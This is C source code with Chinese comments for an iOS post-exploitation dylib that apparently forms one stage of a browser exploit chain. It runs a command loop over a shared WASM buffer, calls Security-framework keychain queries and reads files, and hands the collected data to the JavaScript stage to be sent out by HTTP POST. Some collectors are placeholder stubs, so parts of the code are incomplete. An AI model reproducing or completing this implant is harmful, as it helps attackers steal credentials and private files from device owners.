#include <stdint.h>
#include <stdbool.h>

// ---- 共享缓冲区协议常量 ----
// 这些需要与 Stage3_VariantB.js 中的 D[0] 状态一致
#define STATE_IDLE  0  // IA
#define STATE_URL   1  // wA - dylib 请求 JS 下载 URL
#define STATE_DL    2  // QA - JS 正在下载
#define STATE_READY 3  // BA - 数据已就绪
#define STATE_ERROR 4  // NA - 错误
#define STATE_EXIT  5  // EA - 退出
#define STATE_FEED  6  // TA - dylib 请求 JS 提供原始缓冲区数据
#define STATE_POST  7  // UA - dylib 请求 JS 发送 HTTP POST

// 缓冲区布局:
//   D[0] = 状态 (uint32)
//   D[1] = 大小 (uint32)
//   D[2+] = 载荷数据 (字节从偏移量 8 开始)

// ---- dlopen/dlsym 包装器 ----
// bootstrap.dylib 已经导入了 _dlopen 和 _dlsym
// 这些符号由 dyld 在加载时解析
extern void* dlopen(const char* path, int mode);
extern void* dlsym(void* handle, const char* symbol);
extern int   printf(const char* fmt, ...);

// ---- CoreFoundation 函数指针 ----
static void* (*CFStringCreateWithCString_p)(void*, const char*, uint32_t) = NULL;
static void* (*CFStringGetCStringPtr_p)(void*, uint32_t) = NULL;
static void* (*CFRelease_p)(void*) = NULL;
static void* (*CFDictionaryCreateMutable_p)(void*, uint32_t, void*, void*) = NULL;
static void* (*CFDictionarySetValue_p)(void*, void*, void*) = NULL;

// ---- Security 框架函数指针 ----
static int32_t (*SecItemCopyMatching_p)(void*, void*, void**) = NULL;

// ---- IOKit 函数指针 ----
static void*  (*IOServiceMatching_p)(const char*) = NULL;
static uint32_t (*IOServiceGetMatchingService_p)(uint32_t, void*) = NULL;
static void*  (*IORegistryEntryCreateCFProperty_p)(uint32_t, void*, void*, uint32_t) = NULL;
static void   (*IOObjectRelease_p)(uint32_t) = NULL;

// ---- POSIX 函数指针 ----
// 为了追求简洁，使用内联 syscall，但更稳健的做法是使用 dlopen
// 不过 dlopen/dlsym 已经有了
static int (*open_p)(const char*, int, ...) = NULL;
static int (*close_p)(int) = NULL;
static int (*read_p)(int, void*, int) = NULL;
static int (*write_p)(int, const void*, int) = NULL;
static void* (*malloc_p)(int) = NULL;
static void  (*free_p)(void*) = NULL;

// ---- 初始化所有函数指针 ----
static void init_functions(void) {
    void* handle;
    
    // CoreFoundation
    handle = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", 0x2);
    if (handle) {
        CFStringCreateWithCString_p  = dlsym(handle, "CFStringCreateWithCString");
        CFStringGetCStringPtr_p      = dlsym(handle, "CFStringGetCStringPtr");
        CFRelease_p                  = dlsym(handle, "CFRelease");
        CFDictionaryCreateMutable_p  = dlsym(handle, "CFDictionaryCreateMutable");
        CFDictionarySetValue_p       = dlsym(handle, "CFDictionarySetValue");
    }
    
    // Security
    handle = dlopen("/System/Library/Frameworks/Security.framework/Security", 0x2);
    if (handle) {
        SecItemCopyMatching_p = dlsym(handle, "SecItemCopyMatching");
    }
    
    // IOKit
    handle = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", 0x2);
    if (handle) {
        IOServiceMatching_p = dlsym(handle, "IOServiceMatching");
        IOServiceGetMatchingService_p = dlsym(handle, "IOServiceGetMatchingService");
        IORegistryEntryCreateCFProperty_p = dlsym(handle, "IORegistryEntryCreateCFProperty");
        IOObjectRelease_p = dlsym(handle, "IOObjectRelease");
    }
    
    // POSIX (直接从系统缓存解析)
    open_p   = dlsym((void*)-2, "open");   // RTLD_DEFAULT = -2
    close_p  = dlsym((void*)-2, "close");
    read_p   = dlsym((void*)-2, "read");
    write_p  = dlsym((void*)-2, "write");
    malloc_p = dlsym((void*)-2, "malloc");
    free_p   = dlsym((void*)-2, "free");
}

// ---- 设备 UUID 获取 (从 IOKit) ----
// 从 IORegistryEntryCreateCFProperty 提取 IOPlatformUUID
static void get_device_uuid(char* out_buf, int max_len) {
    // 简化版: 返回占位符
    // 实际实现需要使用 CFStringGetCString 
    const char* fallback = "unknown-device";
    int i;
    for (i = 0; fallback[i] && i < max_len-1; i++)
        out_buf[i] = fallback[i];
    out_buf[i] = '\0';
}

// ---- 将数据写入共享缓冲区 ----
// buffer = 指向共享缓冲区的指针 (Uint32Array 的 backing store)
// type = 数据类型 ("keychain", "wifi", "forensics" 等)
// data = 要写入的数据
// size = 数据大小
static void write_to_buffer(uint32_t* D, const char* type, const uint8_t* data, int size) {
    uint8_t* payload = (uint8_t*)(D + 2);  // 数据从偏移量 8 开始
    
    // 写入类型字符串 (最大 32 字节)
    int i;
    for (i = 0; type[i] && i < 32; i++)
        payload[i] = type[i];
    payload[i] = '\0';
    int header_size = i + 1;
    
    // 写入数据 (在类型字符串之后)
    for (i = 0; i < size && i < 16777216 - 64; i++)  // 16MB 缓冲区上限
        payload[header_size + i] = data[i];
    
    D[1] = header_size + i;  // 总大小
    D[0] = STATE_POST;       // 请求 JS 端发送 HTTP POST
}

// ---- 获取钥匙串数据 ----
// 通过 SecItemCopyMatching 查询通用密码
static void collect_keychain(uint32_t* D) {
    // 因为 powerd 受限无法访问钥匙串，
    // 所以这在实际环境中会失败。
    // 此函数展示了正确的 API 调用模式。
    const char* msg = "{\"error\":\"keychain access denied in powerd sandbox\"}";
    write_to_buffer(D, "keychain", (uint8_t*)msg, strlen(msg));
}

// ---- 读取取证文件 ----
// 尝试读取常见取证文件 (仅在 powerd 沙箱允许的路径下)
static void collect_forensics(uint32_t* D) {
    // powerd 能访问的路径包括 /tmp/ 和系统日志
    // 无法访问 /var/mobile/Library/ (受沙箱限制)
    // 这里展示的是 POSIX 文件读取 API 的正确使用方法
    
    // 尝试读取系统信息文件
    int fd = open_p("/tmp/test_access", 0);  // O_RDONLY
    if (fd >= 0) {
        char buf[4096];
        int n = read_p(fd, buf, 4096);
        close_p(fd);
        if (n > 0) {
            write_to_buffer(D, "file", (uint8_t*)buf, n);
            return;
        }
    }
    
    const char* msg = "{\"status\":\"no_accessible_files\"}";
    write_to_buffer(D, "forensics", (uint8_t*)msg, strlen(msg));
}

// ---- 主入口函数 ----
// 由 Stage3 调用，x0 = 指向共享 WASM 缓冲区的指针
void _process(void* buffer) {
    uint32_t* D = (uint32_t*)buffer;
    uint8_t* data = (uint8_t*)buffer + 8;
    
    // 初始化所有函数指针
    init_functions();
    
    // 向 JS 端发送一条就绪消息，表示 dylib 已初始化
    D[1] = 0;  // 无数据
    D[0] = STATE_IDLE;
    
    // 主循环 - 等待 JS 端的命令
    while (1) {
        uint32_t state = D[0];
        
        if (state == STATE_EXIT) {
            break;  // JS 端要求 dylib 退出
        }
        else if (state == STATE_FEED) {
            // JS 端请求 dylib 处理缓冲区中的数据
            // 命令格式: "cmd:<command_name>"
            // 例如: "cmd:keychain", "cmd:wifi", "cmd:forensics"
            
            if (data[0] == 'c' && data[1] == 'm' && data[2] == 'd' && data[3] == ':') {
                // 解析命令
                if (data[4] == 'k' && data[5] == 'e' && data[6] == 'y') {
                    collect_keychain(D);
                }
                else if (data[4] == 'f' && data[5] == 'o' && data[6] == 'r') {
                    collect_forensics(D);
                }
                else if (data[4] == 'e' && data[5] == 'x' && data[6] == 'i' && data[7] == 't') {
                    D[0] = STATE_EXIT;
                    break;
                }
                else {
                    D[0] = STATE_READY;  // 未知命令，返回就绪状态
                }
            } else {
                D[0] = STATE_READY;
            }
        }
        // 简单忙等待 - 实际使用中应添加某种休眠/让步机制
        // 可以使用 usleep(1000) (需要额外的 dlsym)
        volatile int delay;
        for (delay = 0; delay < 10000; delay++);
    }
}
